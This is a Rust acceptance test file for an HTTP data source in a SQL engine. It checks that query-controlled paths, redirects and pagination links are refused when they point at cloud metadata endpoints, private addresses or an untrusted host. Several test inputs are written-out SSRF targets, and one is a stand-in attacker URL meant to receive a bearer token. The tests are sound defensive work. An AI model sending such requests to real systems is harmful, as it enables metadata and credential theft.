//! Acceptance: query-steered requests can't pivot into private networks or carry
//! source credentials cross-origin.

#![allow(
    clippy::unwrap_used,
    clippy::expect_used,
    clippy::panic,
    reason = "tests"
)]

use std::sync::Arc;

use datafusion::arrow::array::Int32Array;
use datafusion::catalog::{CatalogProvider, MemoryCatalogProvider};
use datafusion::execution::config::SessionConfig;
use datafusion::execution::context::SessionContext;
use pawrly_core::{CachePolicy, SourceDef, SourceKind, TableDef};
use pawrly_sources_http::register_http_source;
use serde_json::{Value, json};
use wiremock::matchers::{header, method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

async fn build_ctx() -> (SessionContext, Arc<MemoryCatalogProvider>) {
    let cfg = SessionConfig::new()
        .with_default_catalog_and_schema("pawrly", "default")
        .with_create_default_catalog_and_schema(false);
    let ctx = SessionContext::new_with_config(cfg);
    let catalog: Arc<MemoryCatalogProvider> = Arc::new(MemoryCatalogProvider::new());
    let default_schema: Arc<dyn datafusion::catalog::SchemaProvider> =
        Arc::new(datafusion::catalog::MemorySchemaProvider::new());
    let _ = catalog.register_schema("default", default_schema).unwrap();
    ctx.register_catalog("pawrly", catalog.clone());
    (ctx, catalog)
}

fn raw_source(base_url: String, auth: Option<Value>) -> SourceDef {
    let mut config = json!({ "base_url": base_url });
    if let Some(a) = auth {
        config["auth"] = a;
    }
    SourceDef {
        name: "api".into(),
        kind: SourceKind::Http,
        description: None,
        wiki: None,
        examples: Vec::new(),
        config,
        cache: CachePolicy::None,
        safety: None,
        tables: Vec::new(),
        raw_table: true,
        raw_table_safety: None,
    }
}

fn typed_source(base_url: String, table_config: Value) -> SourceDef {
    SourceDef {
        name: "api".into(),
        kind: SourceKind::Http,
        description: None,
        wiki: None,
        examples: Vec::new(),
        config: json!({ "base_url": base_url }),
        cache: CachePolicy::None,
        safety: None,
        tables: vec![TableDef {
            name: "data".into(),
            description: None,
            wiki: None,
            config: table_config,
            cache: None,
            safety: None,
        }],
        raw_table: false,
        raw_table_safety: None,
    }
}

async fn query_err(ctx: &SessionContext, sql: &str) -> String {
    let df = ctx.sql(sql).await.expect("plan");
    match df.collect().await {
        Ok(batches) => panic!("expected refusal, got {} batches", batches.len()),
        Err(e) => e.to_string(),
    }
}

#[tokio::test]
async fn raw_path_pivot_to_private_targets_is_refused() {
    let (ctx, catalog) = build_ctx().await;
    let def = raw_source("http://127.0.0.1:9/".into(), None);
    register_http_source(&def, &ctx, catalog.as_ref())
        .await
        .expect("register");

    for target in [
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.8/admin",
        "http://metadata.google.internal/computeMetadata/v1/",
    ] {
        let err = query_err(
            &ctx,
            &format!("SELECT response_status FROM api WHERE request_path = '{target}'"),
        )
        .await;
        assert!(err.contains("refusing cross-origin request"), "{err}");
    }
}

#[tokio::test]
async fn raw_path_pivot_never_carries_credentials() {
    let (ctx, catalog) = build_ctx().await;
    let def = raw_source(
        "http://127.0.0.1:9/".into(),
        Some(
            json!({ "type": "header", "headers": [ { "name": "Authorization", "bearer": "tkn-123" } ] }),
        ),
    );
    register_http_source(&def, &ctx, catalog.as_ref())
        .await
        .expect("register");

    let err = query_err(
        &ctx,
        "SELECT response_status FROM api WHERE request_path = 'https://attacker.example/collect'",
    )
    .await;
    assert!(
        err.contains("credentials") && err.contains("cross-origin"),
        "{err}"
    );
}

// The sibling answers 200 only when the Authorization header arrives.
#[tokio::test]
async fn allowed_host_pivot_carries_credentials() {
    let sibling = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/blob"))
        .and(header("authorization", "Bearer tkn-123"))
        .respond_with(ResponseTemplate::new(200).set_body_string("ok"))
        .mount(&sibling)
        .await;

    let (ctx, catalog) = build_ctx().await;
    let def = SourceDef {
        name: "api".into(),
        kind: SourceKind::Http,
        description: None,
        wiki: None,
        examples: Vec::new(),
        config: json!({
            "base_url": "http://127.0.0.1:9/",
            "auth": { "type": "header", "headers": [ { "name": "Authorization", "bearer": "tkn-123" } ] },
            "allowed_hosts": [ sibling.address().ip().to_string() ]
        }),
        cache: CachePolicy::None,
        safety: None,
        tables: Vec::new(),
        raw_table: true,
        raw_table_safety: None,
    };
    register_http_source(&def, &ctx, catalog.as_ref())
        .await
        .expect("register");

    let df = ctx
        .sql(&format!(
            "SELECT response_status FROM api WHERE request_path = '{}/blob'",
            sibling.uri()
        ))
        .await
        .expect("plan");
    let batches = df.collect().await.expect("execute");
    let status = batches[0]
        .column(0)
        .as_any()
        .downcast_ref::<Int32Array>()
        .expect("i32")
        .value(0);
    assert_eq!(
        status, 200,
        "credentialed pivot to allowed host should succeed"
    );
}

#[tokio::test]
async fn redirect_to_metadata_endpoint_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/facts"))
        .respond_with(
            ResponseTemplate::new(302)
                .insert_header("location", "http://169.254.169.254/latest/meta-data/"),
        )
        .mount(&server)
        .await;

    let (ctx, catalog) = build_ctx().await;
    let def = typed_source(
        server.uri(),
        json!({
            "endpoint": "/facts",
            "response": {
                "path": "$",
                "schema": [ { "name": "id", "type": "bigint" } ]
            }
        }),
    );
    register_http_source(&def, &ctx, catalog.as_ref())
        .await
        .expect("register");

    let err = query_err(&ctx, "SELECT id FROM api.data").await;
    assert!(err.contains("refus"), "{err}");
}

#[tokio::test]
async fn authed_redirect_to_untrusted_host_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/facts"))
        .respond_with(ResponseTemplate::new(302).insert_header("location", "https://example.com/x"))
        .mount(&server)
        .await;

    let (ctx, catalog) = build_ctx().await;
    let def = SourceDef {
        name: "api".into(),
        kind: SourceKind::Http,
        description: None,
        wiki: None,
        examples: Vec::new(),
        config: json!({
            "base_url": server.uri(),
            "auth": { "type": "header", "headers": [ { "name": "X-Api-Key", "value": "secret" } ] }
        }),
        cache: CachePolicy::None,
        safety: None,
        tables: vec![TableDef {
            name: "data".into(),
            description: None,
            wiki: None,
            config: json!({
                "endpoint": "/facts",
                "response": { "path": "$", "schema": [ { "name": "id", "type": "bigint" } ] }
            }),
            cache: None,
            safety: None,
        }],
        raw_table: false,
        raw_table_safety: None,
    };
    register_http_source(&def, &ctx, catalog.as_ref())
        .await
        .expect("register");

    let err = query_err(&ctx, "SELECT id FROM api.data").await;
    assert!(err.contains("credentialed redirect"), "{err}");
}

#[tokio::test]
async fn pagination_link_to_private_network_is_refused() {
    let server = MockServer::start().await;
    Mock::given(method("GET"))
        .and(path("/facts"))
        .respond_with(
            ResponseTemplate::new(200)
                .insert_header("link", "<http://10.0.0.8/facts?page=2>; rel=\"next\"")
                .set_body_json(json!([ { "id": 1 } ])),
        )
        .mount(&server)
        .await;

    let (ctx, catalog) = build_ctx().await;
    let def = typed_source(
        server.uri(),
        json!({
            "endpoint": "/facts",
            "response": {
                "path": "$",
                "schema": [ { "name": "id", "type": "bigint" } ]
            },
            "pagination": { "type": "link_header" }
        }),
    );
    register_http_source(&def, &ctx, catalog.as_ref())
        .await
        .expect("register");

    let err = query_err(&ctx, "SELECT id FROM api.data").await;
    assert!(err.contains("refusing cross-origin request"), "{err}");
}
